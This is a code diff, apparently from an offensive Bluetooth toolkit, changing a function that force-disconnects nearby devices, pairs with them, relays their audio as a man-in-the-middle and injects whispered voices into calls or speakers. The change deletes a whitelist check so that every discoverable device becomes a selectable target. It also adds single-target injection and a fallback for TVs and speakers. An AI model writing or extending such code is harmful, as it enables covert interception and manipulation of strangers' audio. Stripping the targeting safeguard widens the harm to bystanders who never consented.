@@ -1379,29 +1379,16 @@ def _generate_whispers_from_text(text_file, output_dir=None, lang="en"):
 
 def mode_whisper(iface, iface2, whispers_dir, whisper_volume=0.15, include_ble=True,
                  whispers_text=None, whisper_lang="en"):
-    """Intercept Bluetooth audio between two non-whitelisted devices
-    and inject whispered voices when multiple ambient sounds are detected.
+    """Inject whispered voices into Bluetooth audio (SCO or A2DP).
 
-    Requires 2 Bluetooth adapters (iface + iface2).
     Steps:
-      1. Load whisper .wav files
-      2. Discover non-whitelisted devices
-      3. User selects target pair (device A & device B)
-      4. Force-disconnect A from B
-      5. Pair & connect to A (adapter 1) and B (adapter 2) via SCO
-      6. Relay audio A↔B with whisper injection
+      1. Load whisper .wav files (or generate from text via espeak)
+      2. Discover all available Bluetooth devices
+      3. User selects target(s): 1 target (direct) or 2 targets (MITM)
+      4. Force-disconnect target(s)
+      5. Pair & connect via SCO (voice) or A2DP fallback (TV/speakers)
+      6. Inject whispers / relay audio with injection
     """
-
-    whitelist = load_whitelist()
-    if not whitelist:
-        print(colored("[!] No whitelist found. Run mode 1 first.", "red"))
-        sys.exit(1)
-
-    wl_macs = {m.upper() for m in whitelist.keys()}
-    all_known = set(wl_macs)
-    for info in whitelist.values():
-        for peer_mac in info.get("allowed_peers", {}).keys():
-            all_known.add(peer_mac.upper())
 
     if not iface2:
         print(colored("[*] No -o: single-target injection mode only.", "yellow"))
@@ -1854,9 +1841,9 @@ def mode_whisper(iface, iface2, whispers_dir, whisper_volume=0.15, include_ble=T
         sys.exit(1)
     print(colored("[+] Loaded {} whisper file(s)\n".format(len(whispers)), "green"))
 
-    # Step 2: Discover non-whitelisted devices
+    # Step 2: Discover all available Bluetooth devices
     has_hcitool = shutil.which("hcitool") is not None
-    print(colored("[*] Scanning for non-whitelisted devices ...", "cyan"))
+    print(colored("[*] Scanning for available Bluetooth devices ...", "cyan"))
     targets = {}
     if has_hcitool:
         try:
@@ -1869,8 +1856,7 @@ def mode_whisper(iface, iface2, whispers_dir, whisper_volume=0.15, include_ble=T
                 if m:
                     mac = m.group(1).upper()
                     name = m.group(2).strip() or "<unknown>"
-                    if mac not in all_known:
-                        targets[mac] = {"name": name, "type": "classic"}
+                    targets[mac] = {"name": name, "type": "classic"}
         except Exception:
             pass
         if include_ble:
@@ -1894,23 +1880,22 @@ def mode_whisper(iface, iface2, whispers_dir, whisper_volume=0.15, include_ble=T
                         name = m.group(2).strip()
                         if name in ("(unknown)", ""):
                             name = "<unknown>"
-                        if mac not in all_known and mac not in targets:
+                        if mac not in targets:
                             targets[mac] = {"name": name, "type": "ble"}
             except Exception:
                 pass
     else:
         devs = _btctl_scan(10)
         for mac, info in devs.items():
-            if mac not in all_known:
-                targets[mac] = info
+            targets[mac] = info
 
     if len(targets) < 1:
-        print(colored("[!] No non-whitelisted devices found.", "red"))
+        print(colored("[!] No Bluetooth devices found.", "red"))
         sys.exit(1)
 
     # Step 3: User selects target(s)
     sorted_targets = sorted(targets.items())
-    print(colored("\n  Non-whitelisted devices:", "yellow", attrs=["bold"]))
+    print(colored("\n  Available devices:", "yellow", attrs=["bold"]))
     print("   #   MAC                 NAME                         TYPE")
     print("   " + "-" * 63)
     for i, (mac, info) in enumerate(sorted_targets, 1):
